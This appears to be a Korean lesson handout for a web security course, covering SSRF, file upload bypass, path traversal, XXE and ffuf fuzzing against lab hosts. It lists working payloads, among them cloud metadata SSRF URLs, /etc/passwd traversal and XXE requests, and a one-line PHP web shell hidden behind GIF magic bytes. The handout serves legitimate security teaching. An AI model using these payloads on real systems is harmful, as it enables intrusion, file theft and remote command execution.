# Week 07 — OWASP A10 + A05 + A03 — SSRF / 파일 업로드 / 경로 탐색

> 본 주차는 OWASP A10 (SSRF) + A05 (Security Misconfiguration / 파일 업로드) +
> A03 (Path Traversal). admin.6v6.lab + govportal.6v6.lab + ffuf 사용.

## 학습 목표

1. SSRF (Server-Side Request Forgery) 의 동작 + 우회
2. 파일 업로드 검증 우회 (확장자 / Content-Type / Magic Bytes)
3. Path Traversal (..%2f / null byte)
4. ffuf 으로 파일 업로드 + LFI fuzzing
5. ATT&CK + CWE 매핑

## 1. SSRF

서버가 사용자 입력으로 외부 URL 요청 → 내부 자원 접근.

```
# 정상
POST /api/fetch  body={url: "https://api.example.com/data"}

# SSRF
POST /api/fetch  body={url: "http://localhost/admin"}   # 내부 admin
POST /api/fetch  body={url: "http://169.254.169.254/"}  # AWS metadata
POST /api/fetch  body={url: "file:///etc/passwd"}        # file scheme
```

우회 패턴:
- URL encoding: `http%3A%2F%2Flocalhost`
- IP 변형: `127.0.0.1` / `127.1` / `0x7f000001` / `2130706433`
- DNS rebinding (시간차)

## 2. 파일 업로드

### 2.1 확장자 우회

```
shell.php       → blacklist 차단
shell.phtml     → 우회 가능
shell.php5
shell.php.jpg   → MIME 우회
shell.php%00.jpg # null byte (legacy)
```

### 2.2 Content-Type 우회

```
Content-Type: image/jpeg   # 헤더만 가짜
```

### 2.3 Magic Bytes 우회

```
GIF89a<?php system($_GET['c']); ?>
```

파일 시작이 GIF magic bytes 라 검증 통과.

## 3. Path Traversal

```
GET /api/file?path=../../../etc/passwd
GET /api/file?path=..%2f..%2f..%2fetc%2fpasswd       # URL encode
GET /api/file?path=....//....//....//etc/passwd      # 우회
GET /api/file?path=../etc/passwd%00.jpg              # null byte
```

## 4. ffuf fuzzing

```
# path 단어 fuzz
ffuf -u http://target/FUZZ -w wordlist.txt

# parameter 값 fuzz
ffuf -u http://target/?id=FUZZ -w num.txt

# header 값 fuzz
ffuf -u http://target -H "User-Agent: FUZZ" -w ua.txt
```

## 5. 실습 1~5

### 1 — admin.6v6.lab RCE 시도

```
ssh 6v6-attacker 'curl -s -H "Host: admin.6v6.lab" "http://10.20.30.1/api/run?cmd=id" 2>&1 | head'
```

### 2 — Path Traversal

```
ssh 6v6-attacker 'curl -s -o /dev/null -w "%{http_code}\n" -H "Host: juice.6v6.lab" "http://10.20.30.1/?file=../../../etc/passwd"'
ssh 6v6-attacker 'curl -s -o /dev/null -w "%{http_code}\n" -H "Host: juice.6v6.lab" "http://10.20.30.1/?file=%2e%2e%2f%2e%2e%2fetc%2fpasswd"'
```

### 3 — XXE (XML External Entity)

```
ssh 6v6-attacker 'curl -s -X POST -H "Host: admin.6v6.lab" -H "Content-Type: application/xml" \
    -d "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><foo>&xxe;</foo>" \
    http://10.20.30.1/api/parse 2>&1 | head'
```

### 4 — ffuf 경로 fuzz

```
ssh 6v6-attacker 'timeout 30 ffuf -u "http://10.20.30.1/FUZZ" -H "Host: juice.6v6.lab" \
    -w /usr/share/dirb/wordlists/common.txt -mc 200,302 2>&1 | head -20' || true
```

### 5 — ModSec 차단 패턴

```
ssh 6v6-web 'sudo tail -3 /var/log/apache2/modsec_audit.log | head -1 | jq ".transaction.messages[] | select(.id | startswith(\"930\") or startswith(\"932\")) | {id, msg}"'
```

## 6. 과제

A. 3 카테고리 페이로드 (필수) — SSRF / 파일업로드 / Path Traversal 각 2 변형
B. ffuf 결과 (심화) — 발견 endpoint 5+
C. ModSec 차단 비율 (정성)

## 7. W08 (중간고사) 예고

CTF 형식 90분 시험. 8 vuln 사이트 중 무작위 3 challenge.
